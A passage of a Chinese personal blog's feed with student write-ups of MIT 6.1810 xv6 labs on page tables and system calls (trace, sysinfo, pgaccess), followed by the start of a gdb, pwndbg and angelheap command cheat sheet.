 <span class="keyword">if</span>(p-&gt;usyscall)</span><br><span class="line">    kfree((<span class="type">void</span>*)p-&gt;usyscall);</span><br><span class="line">  p-&gt;usyscall = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>在 <code>proc_freepagetable</code> 取消页面映射（这里实验文档没说，要自己发现在 <code>freeproc</code> 函数中调用了这个函数）</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">proc_freepagetable</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  uvmunmap(pagetable, TRAMPOLINE, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, TRAPFRAME, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmunmap(pagetable, USYSCALL, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  uvmfree(pagetable, sz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提问：还有什么其他的系统调用可以通过这样的共享页来加快速度？</p><p>怎么感觉没有了</p><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>xv6 使用三级页表，在运行第一个用户进程时打印出其页表</p><p>这里使用一个静态变量 level 表示在第几级页表</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">pteprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable, <span class="type">int</span> level)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">512</span>; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> pte = pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(pte &amp; PTE_V) &#123;</span><br><span class="line">      uint64 child = PTE2PA(pte);</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; level; j++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; ..&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, child);</span><br><span class="line">      <span class="keyword">if</span>((pte &amp; (PTE_R | PTE_W | PTE_X)) == <span class="number">0</span>)</span><br><span class="line">        pteprint((<span class="type">pagetable_t</span>)child, level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">vmprint</span><span class="params">(<span class="type">pagetable_t</span> pagetable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>, pagetable);</span><br><span class="line">  pteprint(pagetable, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>笔者之前使用局部静态变量来判断 level，但是想着如果是多线程的话没有加锁可能会出问题</p><p>然后在 defs.h 和 exec.c 中添加声明和使用就行</p><h2 id="Detect-which-pages-have-been-accessed"><a href="#Detect-which-pages-have-been-accessed" class="headerlink" title="Detect which pages have been accessed"></a>Detect which pages have been accessed</h2><p>RISC-V 硬件会在 TLB 命中失败时，将对应 PTE 的 Access 标志位设 1，用来记录该页面有没有访问过</p><p>写一个系统调用，三个参数，检测的地址，检测的页数，bitmask</p><p>挺简单的，不知道为什么实验难度写着 hard</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1L &lt;&lt; 6)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">sys_pgaccess</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123; </span><br><span class="line">  uint64 base;</span><br><span class="line">  uint64 mask;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> abits;</span><br><span class="line"></span><br><span class="line">  argaddr(<span class="number">0</span>, &amp;base);</span><br><span class="line">  argint(<span class="number">1</span>, &amp;len);</span><br><span class="line">  <span class="keyword">if</span>(len &gt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  argaddr(<span class="number">2</span>, &amp;mask);</span><br><span class="line"></span><br><span class="line">  abits = <span class="number">0</span>;</span><br><span class="line">  <span class="type">pagetable_t</span> pagetable = myproc()-&gt;pagetable;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="type">pte_t</span> *pte = walk(pagetable, base + PGSIZE * i, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(pte == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_A) &#123;</span><br><span class="line">      abits |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">      *pte &amp;= ~PTE_A;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, mask, (<span class="type">char</span>*)&amp;abits, <span class="keyword">sizeof</span>(abits)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;``</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意检测完后，将标记置零，不然不知道检测后还没有访问过</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="使用-super-pages-减少页表中-PTE-的数量"><a href="#使用-super-pages-减少页表中-PTE-的数量" class="headerlink" title="使用 super-pages 减少页表中 PTE 的数量"></a>使用 super-pages 减少页表中 PTE 的数量</h3><p>不是很懂，改用更大的页（？）</p><h3 id="取消用户进程的第一页的映射，"><a href="#取消用户进程的第一页的映射，" class="headerlink" title="取消用户进程的第一页的映射，"></a>取消用户进程的第一页的映射，</h3><p>这样可以使引用空指针直接造成错误</p><p>需要修改 user.ld 文件，让进程的 text 段从 0x1000 开始，而不是 0</p><p>估计要改很多东西（uvmmap，uvmalloc啥的）。。。咕咕咕</p><h3 id="添加一个系统调用报告-dirty-pages（修改过的页表）"><a href="#添加一个系统调用报告-dirty-pages（修改过的页表）" class="headerlink" title="添加一个系统调用报告 dirty pages（修改过的页表）"></a>添加一个系统调用报告 dirty pages（修改过的页表）</h3><p>和第三个差不多，就不做了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab2 System Calls</title>
    <link href="https://humoooor.cn/2022/10/20/Lab2_System_calls/"/>
    <id>https://humoooor.cn/2022/10/20/Lab2_System_calls/</id>
    <published>2022-10-20T01:36:00.000Z</published>
    <updated>2023-05-23T03:22:36.261Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="实验开始前"><a href="#实验开始前" class="headerlink" title="实验开始前"></a>实验开始前</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout syscall</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="使用-gdb"><a href="#使用-gdb" class="headerlink" title="使用 gdb"></a>使用 gdb</h2><ol><li>查看 backtrace 的输出，哪个函数调用了 syscall<ul><li><code>usertrap()</code></li><li>在 syscall 设置断点后，输入 <code>backtrace</code> 查看栈回溯</li></ul></li><li>p-&gt;trapframe-&gt;a7 的值是多少，值代表什么？<ul><li>7，代表系统调用号 SYS_exec</li><li><code>p/x *p-&gt;trapframe</code> 输出 p 的 trapframe 内容</li></ul></li><li>CPU 的上一个模式是什么？<ul><li>用户模式</li><li><code>p/x $sstatus</code> 输出 sstatus 寄存器的值，0x22</li><li>在 <code>kernel/riscv.h</code> 中有定义：<code>#define SSTATUS_SPP (1L &lt;&lt; 8)  // Previous mode, 1=Supervisor, 0=User</code>，也可以看给的文档</li><li>这里的 SPP 位为 0，因此上一个模式是用户模式</li></ul></li><li>令 <code>num = * (int *) 0;</code>，kernel 在哪条汇编指令 panic，哪个寄存器对应变量 num<ul><li><code>lw a3, 0(zero)</code>，a3</li><li>查看 panic 时 spec 寄存器的值指向哪个汇编</li></ul></li><li>为什么内核崩溃了？在内核地址空间 0 地址有映射吗？上面的 scause 值是否证实这一点？<ul><li>因为尝试读取 0 地址，它没有有效映射</li><li>寄存器 scause 表示发生 trap 的原因，这里的 scause 是 0xd，查看文档可以知道，0xd 表示 Load page fault，合理</li></ul></li><li>当内核 panic 时进程的名字是什么？进程 pid 是多少？<ul><li>“initcode”，1</li></ul></li></ol><p>一开始做因为寄存器的值不了解，还不太能看懂文档，没能理解，跳过了，有些答案是后面更新的</p><p>疑问</p><ul><li>访问到 0 地址时为什么会跳转到 kernelvec 中</li><li>scause、sepc、stval 的含义</li></ul><p>更新：访问 0 发生了 trap，需要跳转到处理内核 trap 的位置，即 <code>kerneltrap</code>，而在处理之前，先保存内核的状态，<code>kernelvec</code> 就是做这样的事情；scause 描述 trap 原因，sepc 保存发生 trap 时 pc 的值，stval 保存发生 trap 的值</p><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>在 <code>user/trace.c</code> 已经写好了程序，只需要实现系统调用即可</p><ol><li>先在 <code>user/user.h</code> 加上原型，在 <code>user/usys.pl</code> 加上 stub（存根），在 <code>kernel/syscall.h</code> 加上系统调用号</li><li>在 <code>kernel.c</code> 的 proc 结构体加上一个新变量 trace_mask</li><li>在 <code>kernel/sysproc.c</code> 加上 <code>sys_trace</code>，设置当前进程的 track_mask</li></ol><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_trace</span><span class="params">(<span class="type">int</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line">  <span class="keyword">if</span>(mask &lt; <span class="number">0</span>)</span><br><span class="line">    mask = <span class="number">0</span>;</span><br><span class="line">  myproc()-&gt;trace_mask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>修改 <code>kernel/proc.c</code> 的 <code>fork</code> 函数，将父进程的 tracemask 传给子进程</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;trace_mask = p-&gt;trace_mask;</span><br></pre></td></tr></table></figure><ol start="5"><li>修改 <code>kernel/syscall.c</code> 的 <code>syscall</code> 函数，如果是 trace_mask 对应的系统调用号，就打印出来（里面还要添加一个字符串数组 syscallNames）</li></ol><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = syscalls[num]();</span><br><span class="line">p-&gt;trapframe-&gt;a0 = ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;tracemask &amp;&amp; <span class="number">1</span>&lt;&lt;num)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br></pre></td></tr></table></figure><p>一个很简单的系统调用，仅仅是获取系统调用参数，然后将参数传给 p-&gt;trace_mask，在 <code>syscall</code> 函数中检查输出调用的系统调用，就可以实现，但是能学到很多细节</p><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><p>这里我们要使用 copyout，因为系统调用函数位处于内核模式，需要进程的页表和虚拟地址来查找用户进程中变量的物理位置（比如 sysinfo 结构体），然后将内核的数据复制给用户进程</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    uint64 si;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    argaddr(<span class="number">0</span>, &amp;si);</span><br><span class="line">    <span class="keyword">if</span>(!si) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    info.freemem = get_freemem();</span><br><span class="line">    info.nproc = get_nproc();</span><br><span class="line">    <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable, si, (<span class="type">char</span>*)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写 get_freemem 时，观察 kalloc 函数，直接从 kmem.freelist 取一页内存返回，可以推测 kmem.freelist 包含所有可用的内存</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_freemem</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint64 n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(r = kmem.freelist; r; r = r-&gt;next) &#123;</span><br><span class="line">    n += <span class="number">4096</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写 ger_nproc 时，观察 procinit 函数，在 proc[NPROC] 数据中遍历初始化，且其中含 state 变量</p><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_nproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  uint64 nproc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">      nproc++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nproc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得在 sysproc.c 引入 sysinfo.h，在 defs.h 加上 get_freemem 和 get_nproc</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="打印出被追踪的系统调用的参数"><a href="#打印出被追踪的系统调用的参数" class="headerlink" title="打印出被追踪的系统调用的参数"></a>打印出被追踪的系统调用的参数</h3><p>每个系统调用参数个数记录在数组里，然后打印出来就好了</p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;trace_mask &amp; <span class="number">1</span>&lt;&lt;num) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; syscall_args[num]; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg%d: %p\n&quot;</span>, i+<span class="number">1</span>, argraw(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印出来是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ trace 32 grep hello README</span><br><span class="line">3: syscall read -&gt; 1023</span><br><span class="line">arg1: 0x00000000000003ff</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br><span class="line">3: syscall read -&gt; 961</span><br><span class="line">arg1: 0x00000000000003c1</span><br><span class="line">arg2: 0x000000000000104e</span><br><span class="line">arg3: 0x00000000000003c1</span><br><span class="line">3: syscall read -&gt; 321</span><br><span class="line">arg1: 0x0000000000000141</span><br><span class="line">arg3: 0x0000000000001037</span><br><span class="line">arg3: 0x00000000000003d8</span><br><span class="line">3: syscall read -&gt; 0</span><br><span class="line">arg1: 0x0000000000000000</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br></pre></td></tr></table></figure><h3 id="计算负载平均值并通过-sysinfo-导出"><a href="#计算负载平均值并通过-sysinfo-导出" class="headerlink" title="计算负载平均值并通过 sysinfo 导出"></a>计算负载平均值并通过 sysinfo 导出</h3><p>可以借用 Linux 的算法计算（懒）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Gdb 常用命令</title>
    <link href="https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-10-17T12:10:00.000Z</published>
    <updated>2023-06-01T08:47:53.873Z</updated>
    
    <content type="html"><![CDATA[<p>pwndbg + pwngdb + angelheap</p><span id="more"></span><h2 id="Gdb-原生命令"><a href="#Gdb-原生命令" class="headerlink" title="Gdb 原生命令"></a>Gdb 原生命令</h2><ul><li>c = continue<ul><li>ctrl-c 取消</li></ul></li><li>ni = step 汇编级 n = step C语言级</li><li>si = stepi</li><li>b = break<ul><li>添加地址断点，当运行到端点会停下来</li><li>用 delete，disable，enable 修改断点</li></ul></li><li>watch<ul><li>添加变量断点</li><li>watch &lt;expression&gt; 当变量改变时会停下来</li><li>watch -l &lt;address&gt; 当地址指向的变量改变时会停下来</li><li>rwatch -l &lt;address&gt; 当地址指向的变量被读取时会停下来</li><li>watch var if xxx 添加条件</li></ul></li><li>x/&lt;n/f/u&gt; &lt;addr&gt;<ul><li>打印内存地址中的值</li><li>n 表示内存单元个数</li><li>f 表示输出格式<ul><li>i 汇编</li><li>t 二进制格式</li><li>o 八进制格式</li><li>d 十进制有符号整型</li><li>u 十进制无符号整型</li><li>x 十六进制，补齐前缀 0</li><li>a 十六进制，不补齐</li><li>f 浮点数</li><li>c 字符</li><li>s 字符串</li></ul></li><li>u 表示内存单元大小<ul><li>默认为机器字大小</li><li>b 表示单字节</li><li>h 表示双字节</li><li>w 表示四字节</li><li>g 表示八字节</li></ul></li></ul></li><li>p/&lt;n/f/u&gt; = print<ul><li>打印</li><li>p *(struct elfhdr*) 0x10000</li><li>p *argv@argc<ul><li>打印参数</li></ul></li></ul></li><li>info<ul><li>info registers<ul><li>查看寄存器</li></ul></li><li>info frame<ul><li>查看当前栈帧信息</li></ul></li><li>info breakpoints<ul><li>查看断点</li></ul></li><li>info locals<ul><li>查看本地变量</li></ul></li><li>info args<ul><li>查看函数参数</li></ul></li></ul></li><li>frame &lt;n&gt;<ul><li>跳转到上层栈帧，配合 i frame 使用</li></ul></li><li>list &lt;location&gt;<ul><li>打印地址对应的函数的源代码</li></ul></li><li>bt = backtrace<ul><li>查看所有栈帧信息</li></ul></li><li>layout split<ul><li>进入分离模式，可以查看当前运行的源码和反汇编</li></ul></li><li>up &amp; down<ul><li>进入上 &amp; 下一级函数</li></ul></li><li>set<ul><li>修改变量或寄存器的值</li><li>set var $pc=0x3ffffff000</li></ul></li></ul><h3 id="回溯调试"><a href="#回溯调试" class="headerlink" title="回溯调试"></a>回溯调试</h3><ul><li>record<ul><li>开始记录进程状态</li></ul></li><li>reverse-*<ul><li>加上一些常用的命令，可实现反向运行</li><li>如 reverse-nexti，reverse-finish</li></ul></li></ul><h2 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">parseheap</span><br><span class="line"><span class="comment"># 查看堆中使用情况</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr             prev             size              status           fd             bk</span><br><span class="line">0x603000         0x0              0x290             Used             None           None</span><br><span class="line">0x603290         0x0              0x20              Used             None           None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bins</span><br><span class="line"><span class="comment"># 查看 bin 中情况</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  1]: 0x6032c0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">vis</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Angelheap"><a href="#Angelheap" class="headerlink" title="Angelheap"></a>Angelheap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">chunkinfo + chunkheader address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo 0x603000</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunkptr + chunkdata address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkptr 0x603010</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heapinfo</span><br><span class="line">查看堆的情况</span><br><span class="line"></span><br><span class="line">pwndbg&gt; heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span 